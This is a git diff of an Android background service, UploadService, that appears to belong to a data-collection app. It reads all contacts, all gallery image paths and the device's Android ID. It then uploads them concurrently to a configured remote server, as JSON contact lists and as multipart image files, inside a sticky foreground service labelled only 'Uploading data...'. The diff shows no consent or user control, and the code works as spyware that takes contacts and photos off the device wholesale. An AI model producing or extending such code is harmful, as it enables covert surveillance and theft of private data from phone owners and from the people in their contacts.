@@ -2,17 +2,24 @@ package com.phc.serviceapp;
 
 import static android.content.ContentValues.TAG;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Log;
 
+import androidx.core.app.NotificationCompat;
+
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
@@ -24,7 +31,10 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
@@ -35,20 +45,73 @@ import okhttp3.Response;
 
 public class UploadService extends Service {
 
+    private final ExecutorService executorService = Executors.newFixedThreadPool(4);
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    "UPLOAD_CHANNEL_ID",
+                    "File Upload Service",
+                    NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // Create a notification for the foreground service
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification notification = new NotificationCompat.Builder(this, "UPLOAD_CHANNEL_ID")
+                    .setContentTitle("Upload Service")
+                    .setContentText("Uploading data...")
+                    .setSmallIcon(R.drawable.ic_upload)
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .build();
+            startForeground(1, notification);
+        }
+
+        // Start the existing background tasks
         new Thread(() -> {
             List<String> contacts = fetchContacts();
             List<String> galleryFiles = fetchGalleryData();
-            // Fetch Android device ID
             String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
+            // Process contacts asynchronously
+            if (contacts != null) {
+                for (String contact : contacts) {
+                    executorService.execute(() -> uploadContact(Collections.singletonList(contact), androidId));
+                }
+            }
 
-            // Simulate upload
-            uploadToServer(contacts, galleryFiles, androidId);
+            // Process gallery files asynchronously
+            if (galleryFiles != null) {
+                for (String filePath : galleryFiles) {
+                    executorService.execute(() -> uploadFileAsync(filePath, androidId));
+                }
+            }
+
+            // Stop the foreground service when all tasks are done
+            executorService.shutdown();
+            try {
+                // Await termination of all tasks
+                if (executorService.awaitTermination(60, java.util.concurrent.TimeUnit.SECONDS)) {
+                    stopForeground(true);
+                    stopSelf();
+                }
+            } catch (InterruptedException e) {
+                Log.e(TAG, "Error shutting down executor: ", e);
+            }
         }).start();
-        return START_STICKY;
+
+        return START_STICKY; // Keeps the service running unless explicitly stopped
     }
+
 
     private List<String> fetchContacts() {
         List<String> contacts = new ArrayList<>();
@@ -98,95 +161,147 @@ public class UploadService extends Service {
         return filePaths;
     }
 
-
-
-
-    private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String BaseUrl = getString(R.string.api_domain);
-        String contactsUrl = BaseUrl + "/api/Uploads/Contacts"; // Endpoint for contacts
-        String filesUrl = BaseUrl + "/api/Uploads/Files"; // Endpoint for file uploads
-
-        // Check if the contacts list is empty or null
-        if (contacts == null || contacts.isEmpty()) {
-            Log.e(TAG, "Contacts list is empty or null");
-            return;
-        }
-
-        // Upload contacts as JSON
-        for (String contact : contacts) {
-            if (contact == null || contact.trim().isEmpty()) {
-                Log.e(TAG, "Skipping empty or invalid contact: " + contact);
-                continue;
+    private void uploadContact(List<String> contacts, String androidId) {
+        try {
+            if (contacts == null || contacts.isEmpty()) {
+                Log.e(TAG, "No contacts to upload");
+                return;
             }
 
-            try {
-                String payload = new JSONObject()
-                        .put("type", "contact")
-                        .put("data", escapeSpecialChars(contact))
-                        .put("androidId", androidId)
-                        .toString();
-
-                sendPostRequest(contactsUrl, payload);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload contact: " + contact, e);
-            }
-        }
-
-        // Check if the gallery files list is empty or null
-        if (galleryFiles == null || galleryFiles.isEmpty()) {
-            Log.e(TAG, "Gallery files list is empty or null");
-            return;
-        }
-
-        // Upload gallery files as multipart
-        for (String filePath : galleryFiles) {
-            if (filePath == null || filePath.trim().isEmpty()) {
-                Log.e(TAG, "Skipping empty or invalid file path: " + filePath);
-                continue;
-            }
-
-            File file = new File(filePath);
-            if (file.exists()) {
-                try {
-                    uploadFile(filesUrl, file, androidId);
-                } catch (Exception e) {
-                    Log.e(TAG, "Failed to upload file: " + filePath, e);
+            // Prepare the payload
+            JSONArray contactsArray = new JSONArray();
+            for (String contact : contacts) {
+                if (contact != null && !contact.trim().isEmpty()) {
+                    contactsArray.put(contact); // Add each contact to the JSON array
                 }
-            } else {
-                Log.e(TAG, "File not found: " + filePath);
             }
+
+            JSONObject payload = new JSONObject()
+                    .put("androidId", androidId)
+                    .put("contacts", contactsArray);
+
+            // Send the POST request
+            sendPostRequest(getString(R.string.api_domain) + "/uploadContacts", payload.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to upload contacts", e);
         }
     }
 
+
+    private void uploadFileAsync(String filePath, String androidId) {
+        try {
+            File file = new File(filePath);
+            if (file.exists()) {
+                uploadFile(getString(R.string.api_domain) + "/upload", file, androidId);
+            } else {
+                Log.e(TAG, "File not found: " + filePath);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to upload file: " + filePath, e);
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        stopForeground(true); // Remove the foreground notification
+        executorService.shutdown(); // Shutdown executor service
+    }
+
+
+//    private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
+//        String BASE_URL = getString(R.string.api_domain);
+////        String contactsUrl = BASE_URL + "/api/Uploads/Contacts"; // Endpoint for contacts
+////        String filesUrl = BASE_URL + "/api/Uploads/Files"; // Endpoint for file uploads
+//
+//         String contactsUrl = BASE_URL + "/uploadContacts";
+//         String filesUrl = BASE_URL + "/upload";
+//
+//        // Check if the contacts list is empty or null
+//        if (contacts == null || contacts.isEmpty()) {
+//            Log.e(TAG, "Contacts list is empty or null");
+//            return;
+//        }
+//
+//        // Upload contacts as JSON
+//        for (String contact : contacts) {
+//            if (contact == null || contact.trim().isEmpty()) {
+//                Log.e(TAG, "Skipping empty or invalid contact: " + contact);
+//                continue;
+//            }
+//
+//            try {
+//                String payload = new JSONObject()
+//                        .put("type", "contact")
+//                        .put("data", escapeSpecialChars(contact))
+//                        .put("androidId", androidId)
+//                        .toString();
+//
+//                sendPostRequest(contactsUrl, payload);
+//            } catch (Exception e) {
+//                Log.e(TAG, "Failed to upload contact: " + contact, e);
+//            }
+//        }
+//
+//        // Check if the gallery files list is empty or null
+//        if (galleryFiles == null || galleryFiles.isEmpty()) {
+//            Log.e(TAG, "Gallery files list is empty or null");
+//            return;
+//        }
+//
+//        // Upload gallery files as multipart
+//        for (String filePath : galleryFiles) {
+//            if (filePath == null || filePath.trim().isEmpty()) {
+//                Log.e(TAG, "Skipping empty or invalid file path: " + filePath);
+//                continue;
+//            }
+//
+//            File file = new File(filePath);
+//            if (file.exists()) {
+//                try {
+//                    uploadFile(filesUrl, file, androidId);
+//                } catch (Exception e) {
+//                    Log.e(TAG, "Failed to upload file: " + filePath, e);
+//                }
+//            } else {
+//                Log.e(TAG, "File not found: " + filePath);
+//            }
+//        }
+//    }
+
     // Method to upload file using multipart
     private void uploadFile(String serverUrl, File file, String androidId) throws IOException {
-        // Create a new MultipartBody for file upload
-        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
+        OkHttpClient client = new OkHttpClient.Builder()
+                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                .build();
 
-        // Add the Android ID as part of the form data
-        builder.addFormDataPart("androidId", androidId);
+        MultipartBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("androidId", androidId)
+                .addFormDataPart("file", file.getName(),
+                        RequestBody.create(file, MediaType.parse("image/jpeg")))
+                .build();
 
-        // Add the file as part of the form data
-        builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))); // Ensure 'file' matches server-side form field
-
-        // Build the request body
-        RequestBody requestBody = builder.build();
-
-        // Create a new request with the body
         Request request = new Request.Builder()
                 .url(serverUrl)
                 .post(requestBody)
                 .build();
 
-        // Send the request and handle the response
-        try (Response response = new OkHttpClient().newCall(request).execute()) {
+        try (Response response = client.newCall(request).execute()) {
             if (response.isSuccessful()) {
                 Log.d(TAG, "File upload successful: " + file.getName());
             } else {
-                Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code());
+                String errorBody = response.body() != null ? response.body().string() : "No response body";
+                Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code() + " - " + errorBody);
             }
+        } catch (IOException e) {
+            Log.e(TAG, "Error during file upload: " + file.getName(), e);
+            throw e; // Rethrow to trigger retry logic if needed
         }
     }
+
 
     // Escape special characters in the string to avoid JSON formatting issues
     private String escapeSpecialChars(String input) {
